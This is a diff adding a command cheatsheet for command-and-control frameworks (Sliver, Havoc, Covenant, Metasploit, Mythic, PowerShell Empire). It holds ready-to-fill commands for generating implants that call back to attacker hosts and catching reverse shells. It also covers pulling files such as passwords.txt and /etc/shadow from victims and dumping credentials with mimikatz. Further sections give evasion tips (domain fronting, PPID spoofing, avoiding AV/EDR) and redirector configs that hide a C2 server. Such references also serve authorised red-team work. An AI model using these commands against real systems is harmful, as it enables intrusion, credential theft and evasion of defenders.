@@ -1,0 +1,278 @@
+% c2, command-and-control, post-exploitation
+
+# ============================================================================
+# SLIVER C2 Framework
+# ============================================================================
+
+# Start Sliver server
+sliver-server
+
+# Start Sliver client
+sliver
+
+# Generate Windows implant
+generate --http <callback_url> --save <output_file> --os windows --arch amd64
+$ callback_url: echo -e "http://192.168.1.50:443\nhttps://attacker.com"
+$ output_file: echo -e "/tmp/agent.exe\n/tmp/implant.exe"
+
+# Generate Linux implant
+generate --http <callback_url> --save <output_file> --os linux --arch amd64
+$ callback_url: echo "http://192.168.1.50:443"
+$ output_file: echo "/tmp/agent"
+
+# Start HTTP listener
+http --lport <port>
+$ port: echo -e "443\n8080\n80"
+
+# Start HTTPS listener
+https --lport <port> --cert <cert_file> --key <key_file>
+$ port: echo -e "443\n8443"
+$ cert_file: echo "server.crt"
+$ key_file: echo "server.key"
+
+# List active sessions
+sessions
+
+# Interact with session
+use <session_id>
+$ session_id: echo -e "1\n2\n3"
+
+# Execute command on target
+shell <command>
+$ command: echo -e "whoami\nipconfig\nps"
+
+# Upload file to target
+upload <local_file> <remote_path>
+$ local_file: echo -e "/tmp/payload.exe\n/opt/tools/script.ps1"
+$ remote_path: echo -e "C:\\Windows\\Temp\\payload.exe\n/tmp/script.sh"
+
+# Download file from target
+download <remote_path> <local_file>
+$ remote_path: echo -e "C:\\Users\\victim\\Desktop\\passwords.txt\n/etc/shadow"
+$ local_file: echo "/tmp/downloaded.txt"
+
+# ============================================================================
+# HAVOC C2 Framework
+# ============================================================================
+
+# Start Havoc teamserver
+./havoc server --profile <profile_name>
+$ profile_name: echo -e "default\ncustom"
+
+# Start Havoc client
+./havoc client
+
+# Create listener
+listener add --name <listener_name> --port <port>
+$ listener_name: echo -e "http-listener\nhttps-listener"
+$ port: echo -e "80\n443\n8080"
+
+# Generate payload
+payload generate --listener <listener_name> --format <format> --output <output_file>
+$ listener_name: echo "http-listener"
+$ format: echo -e "exe\nshellcode\npowershell"
+$ output_file: echo -e "/tmp/agent.exe\n/tmp/payload.bin"
+
+# Interact with demon (agent)
+demon interact <demon_id>
+$ demon_id: echo -e "1\n2\n3"
+
+# Execute command
+demon shell <command>
+$ command: echo -e "whoami\nnet user\nipconfig"
+
+# ============================================================================
+# COVENANT C2 Framework (.NET)
+# ============================================================================
+
+# Start Covenant server
+dotnet run --project /opt/Covenant/Covenant
+
+# Access web interface
+# Browse to: https://localhost:7443
+
+# Create HTTP listener (via web UI)
+# Listeners → Create → HTTP
+
+# Generate Grunt (agent) stager
+# Launchers → Binary → Generate
+
+# Interact with Grunt
+# Grunts → Select Grunt → Interact
+
+# Execute command (in Grunt console)
+Shell <command>
+$ command: echo -e "whoami\nnet user\nipconfig"
+
+# Upload file
+Upload <local_file>
+$ local_file: echo "/tmp/payload.exe"
+
+# Download file
+Download <remote_path>
+$ remote_path: echo "C:\\Users\\victim\\Documents\\sensitive.docx"
+
+# ============================================================================
+# METASPLOIT FRAMEWORK (C2 Mode)
+# ============================================================================
+
+# Start Metasploit console
+msfconsole
+
+# Use multi/handler for catching reverse shells
+use exploit/multi/handler
+
+# Set payload
+set payload <payload_type>
+$ payload_type: echo -e "windows/meterpreter/reverse_tcp\nlinux/x64/meterpreter/reverse_tcp\nwindows/x64/meterpreter/reverse_https"
+
+# Set LHOST and LPORT
+set LHOST <attacker_ip>
+set LPORT <port>
+$ attacker_ip: echo -e "192.168.1.50\n10.0.0.50"
+$ port: echo -e "4444\n443\n8080"
+
+# Run handler
+exploit -j
+
+# List active sessions
+sessions -l
+
+# Interact with session
+sessions -i <session_id>
+$ session_id: echo -e "1\n2\n3"
+
+# Background session
+background
+
+# Generate standalone payload
+msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <output>
+$ payload: echo -e "windows/meterpreter/reverse_tcp\nlinux/x64/shell_reverse_tcp"
+$ ip: echo "192.168.1.50"
+$ port: echo -e "4444\n443"
+$ format: echo -e "exe\nelf\npsh"
+$ output: echo -e "/tmp/payload.exe\n/tmp/shell.elf"
+
+# ============================================================================
+# MYTHIC C2 Framework
+# ============================================================================
+
+# Start Mythic server
+./mythic-cli start
+
+# Access web interface
+# Browse to: https://127.0.0.1:7443
+
+# Install agent (Athena, Apollo, Apfell, etc.)
+./mythic-cli install github <agent_repo_url>
+$ agent_repo_url: echo -e "https://github.com/MythicAgents/Apollo\nhttps://github.com/MythicAgents/Athena"
+
+# Create payload profile (via web UI)
+# Payloads → Generate New Payload → Select Agent → Configure
+
+# Start HTTP profile
+# C2 Profiles → HTTP → Start
+
+# Interact with callback
+# Active Callbacks → Select Callback → Task
+
+# Execute command
+shell <command>
+$ command: echo -e "whoami\nps\nls"
+
+# Upload file
+upload <local_file>
+$ local_file: echo "/tmp/payload.exe"
+
+# Download file
+download <remote_path>
+$ remote_path: echo "C:\\Users\\victim\\Desktop\\passwords.txt"
+
+# ============================================================================
+# POWERSHELL EMPIRE / STARKILLER
+# ============================================================================
+
+# Start Empire server
+./empire --rest
+
+# Start Starkiller UI
+starkiller
+
+# Create listener (via CLI)
+listeners
+uselistener http
+set Host <callback_url>
+set Port <port>
+execute
+$ callback_url: echo -e "http://192.168.1.50\nhttp://attacker.com"
+$ port: echo -e "80\n443\n8080"
+
+# Generate stager
+usestager <stager_type>
+set Listener <listener_name>
+execute
+$ stager_type: echo -e "multi/launcher\nwindows/launcher_bat\nwindows/macro"
+$ listener_name: echo "http"
+
+# Interact with agent
+agents
+interact <agent_name>
+$ agent_name: echo -e "AGENT1\nLKJHGFD"
+
+# Execute command
+shell <command>
+$ command: echo -e "whoami\nnet user\nipconfig"
+
+# Use module
+usemodule <module_path>
+$ module_path: echo -e "powershell/collection/screenshot\npowershell/credentials/mimikatz/logonpasswords"
+
+# ============================================================================
+# C2 BEST PRACTICES
+# ============================================================================
+
+# Use encrypted HTTPS channels
+# Callback over common ports (80, 443, 8080)
+# Implement jitter and sleep intervals
+# Use domain fronting when possible
+# Rotate infrastructure regularly
+# Use redirectors (Apache mod_rewrite, Nginx reverse proxy)
+# Implement killdate/killswitch in agents
+# Use process injection and PPID spoofing
+# Avoid triggering AV/EDR signatures
+
+# ============================================================================
+# INFRASTRUCTURE SETUP
+# ============================================================================
+
+# Apache mod_rewrite redirector for domain fronting
+<VirtualHost *:443>
+    ServerName legit-domain.com
+    SSLEngine On
+    SSLProxyEngine On
+    SSLCertificateFile /path/to/cert.crt
+    SSLCertificateKeyFile /path/to/private.key
+
+    RewriteEngine On
+    RewriteCond %{REQUEST_URI} ^/valid-uri-path/.*$
+    RewriteRule ^.*$ https://actual-c2-server.com%{REQUEST_URI} [P,L]
+
+    RewriteRule ^.*$ https://benign-site.com%{REQUEST_URI} [P,L]
+</VirtualHost>
+
+# Nginx reverse proxy redirector
+server {
+    listen 443 ssl;
+    server_name legit-domain.com;
+
+    ssl_certificate /path/to/cert.crt;
+    ssl_certificate_key /path/to/private.key;
+
+    location /valid-uri-path/ {
+        proxy_pass https://actual-c2-server.com;
+    }
+
+    location / {
+        proxy_pass https://benign-site.com;
+    }
+}
